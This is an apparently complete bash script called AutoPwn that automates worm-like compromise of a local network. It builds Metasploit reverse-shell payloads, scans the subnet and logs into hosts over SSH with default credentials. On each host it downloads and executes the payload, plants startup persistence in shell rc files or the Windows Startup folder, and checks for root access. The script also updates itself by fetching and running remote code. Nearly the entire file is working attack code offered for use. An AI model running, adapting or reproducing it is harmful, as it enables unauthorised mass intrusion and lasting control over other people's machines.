#!/bin/bash

version="1.0"

# Variables
youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`

linuxpayload="linux/x86/meterpreter/reverse_tcp"
windowspayload="windows/meterpreter/reverse_tcp"

exclude_ips=("192.168.1.100" "192.168.1.101") # The ips in this list will be excluded from the attack.

lhost="$youripalways" # If you have the duckdns option enabled you need to put here your dns server.

duckdns="no" # It is recommended to use this option because if your ip changes you will still have access to the infected PCs, you can configure your own dns for free here: https://www.duckdns.org
ducktoken=""
duckip="$youripalways"

iprange="${youripalways%.*}.0/24"

winlport="7655"
linlport="4576"

rootpassword="kali"

linuxsshuser="kali"
linuxsshpassword="kali"

windowssshuser="kali"
windowssshpassword="kali"

winworkdir="Desktop" # The working directory.
linworkdir="Desktop" # The working directory.

sshstarttoo="yes" # Open automatically an ssh terminal if it finds a vulnerable PC.
autoroot="yes" # Tests if the victim has root access.
startup="yes" # Adds the exploit to the startup so the victim will be infected forever.

# DO NOT PUT SPACES IN THIS NAMES, USE UNDERSCORES INSTEAD.
linuxoutname="writer.elf"
windowsoutname="writer.exe"

webcon="`curl -s "https://raw.githubusercontent.com/AndySharp44s/AutoPwn/main/autopwn.sh" | cat`"

if [ "$EUID" -ne 0 ]; then
  echo -e "\e[31mThis script must be run as root. Execute sudo su and then the script, Exiting..."
  exit 1
fi

if ! echo "STARTING..." | lolcat; then
  clear
  echo -e "\e[31mThis script must be run after 'sudo su', not directly with 'sudo $0'. Exiting..."
  exit 1
fi
clear

color_transition() {
    while true; do
    	clear
echo -e "\e[31mYOU HAVE AN OUTDATED VERSION, PRESS ENTER TO UPDATE.\n(SOME OF YOUR CONFIGURED DATA MAY BE RESET)\e[0m"
sleep 0.1
clear
echo -e "\e[37mYOU HAVE AN OUTDATED VERSION, PRESS ENTER TO UPDATE.\n(SOME OF YOUR CONFIGURED DATA MAY BE RESET)\e[0m"
        sleep 0.1
    done
}

if echo "$webcon" | grep -q "version=\"$version\""; then
sleep 1
else
    color_transition &
    color_pid=$!
    sleep 0.2
    read -p "" input
    kill $color_pid
    rm -f "$0"
    wget https://raw.githubusercontent.com/AndySharp44s/AutoPwn/main/autopwn.sh -O autopwn.sh
    while [ ! -f "autopwn.sh" ]; do
    sleep 1
    done
    clear
    chmod 777 autopwn.sh

    replace "linux/x86/meterpreter/reverse_tcp" "$linuxpayload" -- autopwn.sh > /dev/null 2>&1
    replace "windows/meterpreter/reverse_tcp" "$windowspayload" -- autopwn.sh > /dev/null 2>&1
    replace 'winlport="8181"' "winlport=\"$winlport\"" -- autopwn.sh > /dev/null 2>&1
    replace 'linlport="8080"' "linlport=\"$linlport\"" -- autopwn.sh > /dev/null 2>&1
    replace 'linuxsshuser="kali"' "sshuser=\"$linuxsshuser\"" -- autopwn.sh > /dev/null 2>&1
    replace 'rootpassword="kali"' "sshuser=\"$linuxsshuser\"" -- autopwn.sh > /dev/null 2>&1
    replace 'linuxsshpassword="kali"' "sshpassword=\"$linuxsshpassword\"" -- autopwn.sh > /dev/null 2>&1
    replace 'windowssshuser="kali"' "sshuser=\"$linuxsshuser\"" -- autopwn.sh > /dev/null 2>&1
    replace 'windowssshpassword="kali"' "sshpassword=\"$linuxsshpassword\"" -- autopwn.sh > /dev/null 2>&1
    replace 'winworkdir="Desktop"' "winworkdir=\"$winworkdir\"" -- autopwn.sh > /dev/null 2>&1
    replace 'linworkdir="Desktop"' "linworkdir=\"$linworkdir\"" -- autopwn.sh > /dev/null 2>&1
    replace 'sshstarttoo="yes"' "sshstarttoo=\"$sshstarttoo\"" -- autopwn.sh > /dev/null 2>&1
    replace 'autoroot="yes"' "autoroot=\"$autoroot\"" -- autopwn.sh > /dev/null 2>&1
    replace 'startup="yes"' "startup=\"$startup\"" -- autopwn.sh > /dev/null 2>&1
    replace 'linuxoutname="writer.elf"' "linuxoutname=\"$linuxoutname\"" -- autopwn.sh > /dev/null 2>&1
    replace 'windowsoutname="writer.exe"' "windowsoutname=\"$windowsoutname\"" -- autopwn.sh > /dev/null 2>&1
    replace 'duckdns="no"' "duckdns=\"$duckdns\"" -- autopwn.sh > /dev/null 2>&1
    replace 'ducktoken=""' "ducktoken=\"$ducktoken\"" -- autopwn.sh > /dev/null 2>&1
    clear
    dos2unix autopwn.sh > /dev/null 2>&1
    clear
    ./autopwn.sh
    echo "Re-execute the script."
    exit -1
fi
    clear

if ! test -d "AutoPWN"; then
	sudo apt install sshpass
	sudo apt install lolcat
 	sudo apt install gnome-terminal
	sudo apt install figlet
	sudo pip install python-nmap
fi

mkdir AutoPWN
clear

# Download font if it doesnt exists
if ! test -f "AutoPWN/Bloody.flf"; then
    wget https://raw.githubusercontent.com/xero/figlet-fonts/master/Bloody.flf -O AutoPWN/Bloody.flf
fi

# Download os detect if it doesnt exists
if ! test -f "osdetect.py"; then
    wget https://raw.githubusercontent.com/AndySharp44s/AutoPwn/main/osdetect.py -O osdetect.py
fi

clear

# Presentación
figlet "AutoPWN" -f AutoPWN/Bloody.flf | lolcat
echo -e "                      By AndySharp44s (v$version)\n\n\n" | lolcat
sleep 5

if [ "$duckdns" = "yes" ]; then
	echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ATTEMPTING TO UPDATE DNS SERVER INFORMATION (\e[9;32m$lhost\e[9;38m)\n\n"
	response=$(curl -s "https://www.duckdns.org/update?domains=$lhost&token=$ducktoken&ip=$duckip")

	if echo "$response" | grep -q "OK"; then
		ping_result=$(ping -c 1 "$lhost")

		ip_obtained=$(echo "$ping_result" | grep -oP '\(\K[^)]+')
    
    		if echo "$ip_obtained" | grep -q "$duckip"; then
			echo -e "\e[9;38m[\e[9;32m+\e[9;38m] INFORMATION UPDATED SUCCESSFULLY, DNS SHOULD BE READY TO WORK.\n\n"
    		else
        		echo -e "\e[9;38m[\e[9;31m-\e[9;38m] DNS SERVER DID NOT UPDATE CORRECTLY, \e[9;32m$duckip\e[9;38m WILL BE USED AS LHOST\n\n"
			lhost="$duckip"
    		fi
	elif [ "$response" = "KO" ]; then
        	echo -e "\e[9;38m[\e[9;31m-\e[9;38m] DNS SERVER DID NOT UPDATE CORRECTLY, \e[9;32m$duckip\e[9;38m WILL BE USED AS LHOST\n\n"
		lhost="$duckip"
	else
        	echo -e "\e[9;38m[\e[9;31m-\e[9;38m] DNS SERVER DID NOT UPDATE CORRECTLY, \e[9;32m$duckip\e[9;38m WILL BE USED AS LHOST\n\n"
		lhost="$duckip"
	fi
fi

# Ejecutar Metasploit

echo -e "\e[9;38m[\e[9;32m+\e[9;38m] CREATING FILE FOR MSF (\e[9;32mLINUX\e[9;38m)\n\n"

echo "touch AutoPWN/msf && clear" > AutoPWN/linmet.txt
echo "use exploit/multi/handler" >> AutoPWN/linmet.txt
echo "set PAYLOAD $linuxpayload" >> AutoPWN/linmet.txt
echo "set LHOST $lhost" >> AutoPWN/linmet.txt
echo "set LPORT $linlport" >> AutoPWN/linmet.txt
echo "exploit -j -z" >> AutoPWN/linmet.txt
echo "clear && figlet \"AutoPWN\" -f AutoPWN/Bloody.flf && echo \"                      By AndySharp44s (v$version)\" && echo \"                               LINUX\n\"" >> AutoPWN/linmet.txt

echo -e "\e[9;38m[\e[9;32m+\e[9;38m] FILE CREATED\n\n"

echo -e "\e[9;38m[\e[9;32m+\e[9;38m] CREATING FILE FOR MSF (\e[9;32mWINDOWS\e[9;38m)\n\n"

echo "touch AutoPWN/msf2 && clear" > AutoPWN/winmet.txt
echo "use exploit/multi/handler" >> AutoPWN/winmet.txt
echo "set PAYLOAD $windowspayload" >> AutoPWN/winmet.txt
echo "set LHOST $lhost" >> AutoPWN/winmet.txt
echo "set LPORT $winlport" >> AutoPWN/winmet.txt
echo "exploit -j -z" >> AutoPWN/winmet.txt
echo "clear && figlet \"AutoPWN\" -f AutoPWN/Bloody.flf && echo \"                      By AndySharp44s (v$version)\" && echo \"                              WINDOWS\n\"" >> AutoPWN/winmet.txt

echo -e "\e[9;38m[\e[9;32m+\e[9;38m] FILE CREATED\n\n"

echo -e "\e[9;38m[\e[9;32m+\e[9;38m] RUNNING MSF (\e[9;32mLINUX\e[9;38m)\n\n"

gnome-terminal -- bash -c "msfconsole -r `pwd`/AutoPWN/linmet.txt | lolcat"

sleep 3

echo -e "\e[9;38m[\e[9;32m+\e[9;38m] RUNNING MSF (\e[9;32mWINDOWS\e[9;38m)\n\n"

gnome-terminal -- bash -c "msfconsole -r `pwd`/AutoPWN/winmet.txt | lolcat"

while [ ! -f "AutoPWN/msf" ]; do
    sleep 1
done

rm AutoPWN/msf

while [ ! -f "AutoPWN/msf2" ]; do
    sleep 1
done

rm AutoPWN/msf2


# Generar exploit
echo -e "\e[9;38m[\e[9;32m+\e[9;38m] GENERATING EXPLOIT FOR \e[9;32mLINUX\n\n"
mkdir -p AutoPWN/server
msfvenom -p ${linuxpayload} LHOST=${lhost} LPORT=${linlport} -f elf > AutoPWN/server/${linuxoutname} 2>/dev/null

echo -e "\e[9;38m[\e[9;32m+\e[9;38m] GENERATING EXPLOIT FOR \e[9;32mWINDOWS\n\n"
mkdir -p AutoPWN/server
msfvenom -p ${windowspayload} LHOST=${lhost} LPORT=${winlport} -f exe > AutoPWN/server/${windowsoutname} 2>/dev/null

# Run HTTP server
echo -e "\e[9;38m[\e[9;32m+\e[9;38m] RUNNING SERVER\n\n"
gnome-terminal -- bash -c "cd `pwd`/AutoPWN/server && python3 -m http.server 4444"

sleep 7

# Scan IPs in the range
echo -e "\e[9;38m[\e[9;32m+\e[9;38m] SCANNING WIFI NETWORK FOR PC(s)\n\n"
nmap -n -sn ${iprange} -oG - | awk '/Up$/{print $2}' > AutoPWN/ips.txt

num_lines=$(wc -l < "AutoPWN/ips.txt")

echo -e "\e[9;38m[\e[9;32m+\e[9;38m] \e[9;32m$num_lines\e[9;38m IP(s) FOUND\n\n"

# Mandar exploit a IPs vulnerables

fecha=`date`

rootfound="false"

echo -e "--------------------$fecha--------------------" >> AutoPWN/SSHlog.txt

for (( i = 1; i <= num_lines; i++ )); do
ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
    if [[ " ${exclude_ips[@]} " =~ " $ip " ]]; then
        echo "THE PC \e[9;31m$ip\e[9;38m IS EXCLUDED, SKIPPING..."
        continue
    fi
    echo -e "\e[9;38m[\e[9;32m+\e[9;38m] CHECKING OS OF THE PC \e[9;32m$ip\e[9;38m, PLEASE WAIT...\n\n"
        
    OS=$(sudo timeout 45 python osdetect.py ${ip})
        
    if echo "$OS" | grep -q "$ip"; then
        OS="\e[9;31mOPERATING SYSTEM NOT IDENTIFIED\e[9;38m"
    elif [ "$OS" = "" ]; then
        OS="\e[9;31mOPERATING SYSTEM NOT IDENTIFIED\e[9;38m"
    fi
        
    echo -e "\e[9;38m[\e[9;32m+\e[9;38m] THE OS OF PC \e[9;32m$ip\e[9;38m IS $OS\n\n"
        
    echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ATTEMPTING TO SEND EXPLOIT TO PC \e[9;32m$ip\e[9;38m ($OS), PLEASE WAIT...\n\n"
        
    if echo "$OS" | grep -q "OPERATING SYSTEM NOT IDENTIFIED"; then
        OS="LINUX"
    fi
        
    if echo "$OS" | grep -q "LINUX"; then
        output=$(timeout 9 sshpass -p "$linuxsshpassword" ssh -o StrictHostKeyChecking=no "$linuxsshuser"@"$ip" "cd $linworkdir & echo old > $linuxoutname & rm -f $linuxoutname & wget http://$youripalways:4444/$linuxoutname && chmod 777 $linuxoutname && echo success && ./$linuxoutname" 2>&1)
    elif echo "$OS" | grep -q "WINDOWS"; then
        output=$(timeout 9 sshpass -p "$windowssshpassword" ssh -o StrictHostKeyChecking=no "$windowssshuser"@"$ip" "cd \"$winworkdir\" & taskkill /F /IM \"$windowsoutname\" & del \"$windowsoutname\" & curl \"http://$youripalways:4444/$windowsoutname\" --output $windowsoutname & echo success & call $windowsoutname" 2>&1)
    fi
        
    echo "$output" >> AutoPWN/SSHlog.txt
        
    if echo "$output" | grep -q "success"; then
        echo -e "\e[9;38m[\e[9;32m+\e[9;38m] EXPLOIT SUCCESSFULLY SENT TO \e[9;32m$ip\e[9;38m!\n\n"
        
        if [ "$startup" = "yes" ]; then
            echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ATTEMPTING TO ADD EXPLOIT TO STARTUP ON PC \e[9;32m$ip\e[9;38m\n\n"
            if echo "$OS" | grep -q "LINUX"; then
                output3=$(timeout 9 sshpass -p "$linuxsshpassword" ssh -o StrictHostKeyChecking=no "$linuxsshuser"@"$ip" "cp -f \"$linworkdir/$linuxoutname\" ~/$linuxoutname & grep -q "\$linuxoutname" "~/.bashrc" || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.bashrc && grep -q "\$linuxoutname" "~/.zshrc" || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.zshrc" 2>&1)
            else
                output3=$(timeout 9 sshpass -p "$windowssshpassword" ssh -o StrictHostKeyChecking=no "$windowssshuser"@"$ip" "copy \"$winworkdir\\$windowsoutname\" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$windowsoutname\" /y" 2>&1)
            fi
    	    echo "$output3" >> AutoPWN/SSHlog.txt
        fi

        if [ "$autoroot" = "yes" ]; then
            if echo "$OS" | grep -q "LINUX"; then
                echo -e "\e[9;38m[\e[9;32m+\e[9;38m] CHECKING IF \e[9;32m$ip\e[9;38m HAS ROOT\n\n"
                output2=$(timeout 7 sshpass -p "$rootpassword" ssh -o StrictHostKeyChecking=no "$ip" "echo '$rootpassword' | sudo -S su -c 'whoami'" 2>&1)
                if echo "$output2" | grep -q "root"; then
                    echo -e "[+] THE PC $ip HAS ROOT!!!\n\n" | lolcat
                    echo -e "[+] The PC $ip has root access with the password $rootpassword.\n" >> AutoPWN/ROOTlog.txt
                    rootfound="true"
                else
                    echo -e "\e[9;38m[\e[9;31m-\e[9;38m] THE PC \e[9;31m$ip\e[9;38m DOES NOT HAVE ROOT\n\n"
                fi
            fi
    	    echo "$output2" >> AutoPWN/SSHlog.txt
        fi
            
        if [ "$sshstarttoo" = "yes" ]; then
            echo -e "\e[9;38m[\e[9;32m+\e[9;38m] OPENING SSH TERMINAL FOR \e[9;32m$ip\n\n"
            gnome-terminal -- bash -c "sshpass -p $linuxsshpassword ssh $linuxsshuser@$ip | lolcat"
        fi
    else
        echo -e "\e[9;38m[\e[9;31m-\e[9;38m] THE COMPUTER \e[9;31m$ip\e[9;38m IS NOT VULNERABLE\n\n"
    fi
    
done

echo -e "\n--------------------$fecha--------------------\n" >> AutoPWN/SSHlog.txt
echo -e "\e[9;38m[\e[9;32m+\e[9;38m] LOG SAVED IN \e[9;32mAutoPWN/SSHlog.txt"

if [ "$rootfound" = "true" ]; then
	echo -e "\n\n[+] ALL USERS WITH ROOT AND THEIR IMPORTANT DATA HAVE BEEN SAVED IN AutoPWN/ROOTlog.txt" | lolcat
fi

exit 1 >/dev/null 2>&1
exit >/dev/null 2>&1
pkill $0 >/dev/null 2>&1
kill $$ >/dev/null 2>&1
